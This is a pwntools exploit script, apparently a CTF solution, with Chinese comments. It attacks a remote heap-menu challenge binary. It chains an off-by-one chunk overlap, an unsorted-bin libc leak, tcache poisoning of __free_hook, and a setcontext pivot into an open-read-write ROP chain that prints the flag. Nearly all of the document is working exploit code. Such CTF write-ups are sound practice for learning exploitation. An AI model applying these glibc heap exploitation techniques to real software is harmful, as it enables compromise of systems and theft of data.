#off-by-one  chunk_overlapping  orw(setcontext+rop)
#该题只有add而无edit,因此许多地方与常规题目不同
from pwn import*
p=remote('ctf.npusec.org.cn',12849)
context.log_level='debug'
context.arch='amd64'
elf=ELF('./pwn')
libc=ELF('./libc.so.6')

def add(index,size,content):
    p.sendlineafter(b'choice>>',b'1')
    p.sendlineafter(b'index?',str(index).encode())
    p.sendlineafter(b'size?',str(size).encode())
    p.sendlineafter(b'content:',content)

def delete(index):
    p.sendlineafter(b'choice>>',b'2')
    p.sendlineafter(b'index',str(index).encode())

def show(index):
    p.sendlineafter(b'choice>>',b'3')
    p.sendlineafter(b'index',str(index).encode())

# gdb.attach(p,'''
# b*malloc
# b*free
# b* $rebase(0xDC5)
# ''')
# pause()
for i in range(7):
    add(i,0xc0,'a'*0x20)
for i in range(7):
    delete(i)
add(7,0x28,'a'*0x20)
add(8,0x28,'b'*0x20)
add(9,0x90,'c'*0x20)
add(10,0x28,'d'*0x20)
delete(7)
payload=b'a'*0x28+b'\xd1'
add(7,0x28,payload)
delete(8)
add(11,0x28,'e'*0x20)
show(9)
p.recvuntil(b'\n')
leak=u64(p.recv(6).ljust(8,b'\x00'))
libc_base=leak-0x3ebca0
free_hook=libc_base+libc.symbols['__free_hook']
setcontext=libc_base+libc.symbols['setcontext']
print('leak:'+hex(leak))
print('libc_base:'+hex(libc_base))
print('free_hook:'+hex(free_hook))
print('setcontext:'+hex(setcontext))
#off_by_one修改后一个chunk的size进而实现堆重叠，从而实现了UAF来进行unsortedbin attack泄露libc


pop_rdi=libc_base+libc.search(asm('pop rdi; ret')).__next__()
pop_rsi=libc_base+libc.search(asm('pop rsi; ret')).__next__()
pop_rdx=libc_base+libc.search(asm('pop rdx; ret')).__next__()

add(0,0x90,b'a')
add(1,0x88,b'a')
add(2,0x88,b'b')
add(3,0x88,b'c')
add(4,0x88,b'd')
delete(1)
add(1,0x88,b'a'*0x88+b'\xf0')
delete(2)
delete(1)
delete(3)
add(2,0xe0,b'a'*0x88+p64(0x91)+p64(free_hook))
add(3,0x80,b'a')
#再次off_buy_one,不过这一次并没有涉及unsortedbin,而是利用UAF来修改tcache的next
#堆布局：修改chunk1的size使chunk1包含chunk2，释放chunk1得到囊括chunk2的tcache chunk
#释放chunk2使其进入tcache,接下来add得到之前释放chunk1得到的大的chunk并向其中写入数据从而完成堆chunk2的next指针的修改

payload=b''
payload+=p64(setcontext+53)
payload+=p64(pop_rdi)
payload+=p64(3)
payload+=p64(pop_rsi)
payload+=p64(free_hook+0x88)
payload+=p64(pop_rdx)
payload+=p64(0x40)
payload+=p64(libc_base+libc.sym['read'])
payload+=p64(pop_rdi)
payload+=p64(free_hook+0x88)
payload+=p64(libc_base+libc.sym['puts'])
payload=payload.ljust(0x80,b'\x00')
payload+=b'./flag\x00'
add(12,0x88,payload)
#orw链

frame=SigreturnFrame()
frame.rsp=free_hook+8
frame.rip=libc_base+libc.symbols['open']
frame.rdi=free_hook+0x80
frame.rsi=0
frame.rdx=0
#通过setcontext来控制各个寄存器的值

add(15,len(frame.__bytes__()),frame.__bytes__())
delete(15)
#向一个chunk中写入frame结构，delete时，rdi的值即为frame的开头，而free_hook被修改成了setcontext中的地址
#便可以通过执行setcontext来控制寄存器的值(基于rdi)

p.interactive()
#由于mprotect也被沙箱禁止，因此setcontext+shellcode的方法行不通